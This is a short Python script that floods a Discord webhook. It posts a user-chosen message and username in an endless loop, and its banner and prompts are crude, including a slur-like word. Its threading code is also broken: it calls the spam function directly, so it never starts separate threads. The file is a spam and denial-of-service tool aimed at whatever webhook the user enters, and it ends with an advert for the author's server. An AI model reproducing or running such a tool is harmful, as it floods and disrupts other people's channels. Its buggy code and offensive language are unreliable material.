import requests
import threading

defaultusername = 'discord webhook destroyer'
defaultmessage = 'zapi xd'

print('discord webhook fucker\n')


def sendtowebhook(webhook, message, username):
    data = {
        'content': message,
        'username': username
    }
    try:
        while True:
            requests.post(webhook, data=data)
    except KeyboardInterrupt: 
        exit()


webhook = input('whats nigor link?: ')
if webhook == '':  # script will crash without webhook
    print('specify a webhook smh, exiting...')
    exit()

username = input('what u want ur user to be?: ')
if username == '':  #  if no user, so default one will be
    username = defaultusername
    print('using default username')

message = input('what message u want to send?: ')
if message == '':  # without a message will cause no sending eh
    message = defaultmessage
    print('using default message')

try:
    threads = int(input('how many threads to fuck ur pc?: '))
    if threads < 1:  # prevent negative or 0 threads from breaking the script
        print('no threads or negative switching to 1..')
        threads = 1
except ValueError:  # prevents ValueError if the result cannot be converted to a string
    threads = 1
    print('invalid amount of threads switching to 1..')

print('started..')

for x in range(threads):
    thread = threading.Thread(
        target=sendtowebhook(webhook, message, username), args=(1,))
    thread.start()
    # threading actually doesn't help very much due to discord's rate limiting


# made by zopai in 5 mins bc i was bored lmao dont forget to join my server https://discord.gg/TkwRjEz5Ft